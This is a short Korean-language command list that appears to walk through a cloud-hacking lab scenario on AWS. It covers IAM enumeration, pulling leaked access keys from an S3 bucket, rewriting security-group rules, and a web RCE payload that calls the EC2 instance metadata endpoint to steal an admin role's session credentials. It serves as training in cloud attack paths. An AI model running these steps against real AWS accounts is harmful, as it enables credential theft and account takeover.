# 시작 단계
`cat start.txt`
`aws configure --profile [시작사용자]`

# 사용자 정보 보기
`aws --profile [사용자] sts get-caller-identity`

# 인라인 정책 확인하기 -> 존재함
`aws --profile [사용자] iam list-user-policies --user-name [user_name]`

# 인라인 정책 자세히 보기)
`aws --profile [사용자] iam get-user-policy --user-name [user_name] --policy-name [정책이름]`

# 관리 정책 확인하기
`aws --profile [사용자] iam list-attached-user-policies --user-name [user_name]`

# ec2 인스턴스 정보 확인하기 (ec2 주소 확인)
`aws ec2 describe-instances --profile [시작사용자]`

# 홈페이지 접속 -> 접속 안될 예정
`http://ec2주소`

# security-group 방화벽 설정 확인
`aws ec2 describe-security-groups --profile [시작사용자]`

# ec2 방화벽 관리자의 AccessKey, SecretKey를 얻기 위한 s3 정보 확인하기 ( 버킷 확인 )
`aws s3 ls --profile [시작사용자]`

# 버킷 디렉토리 접근 후, key 얻기 
`aws s3 ls s3://[버킷이름]/ --profile [시작사용자]`
`aws s3 cp s3://[버킷이름]/[텍스트파일].txt --profile [시작사용자]`
`cat [텍스트파일].txt`

# 키 등록하기
`aws configure --profile [ec2 방화벽 관리자]`

# 인라인 정책 확인하기 -> 존재함
`aws --profile [사용자] iam list-user-policies --user-name [ec2 방화벽 관리자]`

# 정책확인했을 때, ec2와 s3에 접근 가능하다는 것을 알 수있음. (인라인 정책 자세히 보기)
`aws --profile [ec2 방화벽 관리자] iam get-user-policy --user-name [user_name] --policy-name [정책이름]`

# security-group rule 삭제 및 생성 ( 인바운드 기준 )
`aws ec2 revoke-security-group-ingress --group-id <security group id> --protocol <tcp/udp> --port <port number> --cidr <cidr>`
`aws ec2 authorize-security-group-ingress --group-id <security group id> --protocol <tcp/udp> --port <port number> --cidr <cidr>`

#인스턴스 재부팅
`aws ec2 reboot-instances --instance-ids [인스턴스 id] --profile [ec2 방화벽 관리자]`

# ec2 인스턴스 정보 확인하기 (ec2 주소 확인)
`aws ec2 describe-instances --profile [시작사용자]`

# 재접속 -> 접속 성공
`http://ec2주소`

# 웹공격 (RCE)
# aws 관리자 권한 획득
`http://ec2주소?cmd = curl http://169.254.169.254/latest/meta-data/iam/security-credentials/aws_admin_role`

`aws configure --profile [aws 관리자]`
`echo "aws_session_token = {얻은 토큰}" >> ~/.aws/credentials`

# 사용자 정보 보기
`aws --profile [사용자] sts get-caller-identity`

# role에 설정된 정책 살펴보기
`aws iam list-attached-role-policies --role-name [role_name] --profile [aws 관리자]`
